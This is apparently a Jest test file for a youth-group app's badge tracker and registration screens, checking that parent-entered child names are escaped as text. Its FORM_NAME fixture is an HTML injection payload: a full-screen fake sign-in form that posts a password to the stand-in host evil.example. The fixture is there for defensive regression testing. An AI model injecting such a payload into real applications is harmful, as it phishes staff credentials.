/**
 * @jest-environment jsdom
 *
 * Parents write their children's names, and staff screens list them. The
 * page-wide sanitizer keeps forms and inline styles, so a name inserted as
 * markup could lay a fake sign-in form over a leader's screen. Names are now
 * escaped where the screens compose their HTML (and refused by the API when
 * they contain < or >).
 */

jest.mock('../../spa/app.js', () => ({ translate: (key) => key }));
jest.mock('../../spa/utils/DebugUtils.js', () => ({
  debugLog: jest.fn(),
  debugError: jest.fn(),
  debugWarn: jest.fn(),
  debugInfo: jest.fn(),
}));
jest.mock('../../spa/ajax-functions.js', () => ({}));
jest.mock('../../spa/indexedDB.js', () => ({}));
jest.mock('../../spa/api/api-endpoints.js', () => ({}));
jest.mock('../../spa/config.js', () => ({ CONFIG: {}, getStorageKey: (key) => key }));
jest.mock('../../spa/utils/PermissionUtils.js', () => ({
  canApproveBadges: () => true,
  canManageBadges: () => true,
  canViewBadges: () => true,
}));
jest.mock('../../spa/utils/BadgeLabelUtils.js', () => ({ badgeLabel: () => 'Badge' }));
jest.mock('../../spa/utils/DateUtils.js', () => ({ formatDateShort: (value) => value }));

const { BadgeTracker } = require('../../spa/badge_tracker.js');
const { TimeSinceRegistration } = require('../../spa/time_since_registration.js');

const FORM_NAME = '<form action="https://evil.example/x" style="position:fixed;inset:0">'
  + '<input name="password" type="password"><button>Reconnexion</button></form>';

describe('child names on staff screens', () => {
  test('the badge approval queue shows a form-shaped name as text', () => {
    const page = new BadgeTracker({});
    page.templates = [{ id: 3, name: '<u>Akela</u>' }];
    const item = {
      id: 1, participant_id: 1, badge_template_id: 3, first_name: FORM_NAME, last_name: 'Dupont', etoiles: 1,
      objectif: '<b>goal</b>', status: 'pending', date_obtention: '2026-10-01',
    };

    document.body.innerHTML = page.renderQueueItem(item, 'pending');

    expect(document.querySelector('form, input[name="password"], b, u')).toBeNull();
    expect(document.querySelector('.badge-tracker__queue-name').textContent).toBe(`${FORM_NAME} Dupont`);
  });

  test('the badge tracker participant card shows a form-shaped name as text', () => {
    const page = new BadgeTracker({});
    const card = page.renderParticipantCard({
      id: 1, first_name: FORM_NAME, last_name: 'Dupont', totem: '<i>Akela</i>',
      badges: new Map(), hasPending: false, hasUndelivered: false, totalStars: 0,
    });

    document.body.innerHTML = card;

    expect(document.querySelector('form, input[name="password"], i')).toBeNull();
    expect(document.body.textContent).toContain(FORM_NAME);
  });

  test('time since registration, through the real setContent, keeps it as text', () => {
    document.body.innerHTML = '<div id="registration-list"></div>';
    const page = new TimeSinceRegistration({ lang: 'fr' });
    page.participants = [{ id: 1, first_name: FORM_NAME, last_name: 'Dupont', inscription_date: '2026-09-01' }];
    page.sortKey = 'name';
    page.sortDirection = 'asc';

    page.renderList();

    const list = document.getElementById('registration-list');
    expect(list.querySelector('form, input[name="password"]')).toBeNull();
    expect(list.textContent).toContain(FORM_NAME);
  });
});
